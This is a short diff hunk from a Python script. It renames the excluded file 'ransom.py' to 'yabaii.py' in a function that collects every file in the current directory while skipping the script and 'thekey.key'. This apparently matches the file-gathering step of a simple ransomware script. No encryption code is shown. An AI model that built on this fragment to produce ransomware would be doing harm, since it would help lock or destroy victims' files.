@@ -30,7 +30,7 @@ osType = platform.system()
 files = []
 def collect():
   for file in os.listdir():
-    if file == "ransom.py" or file == "thekey.key":
+    if file == "yabaii.py" or file == "thekey.key":
       continue
     if os.path.isfile(file):
       files.append(file)
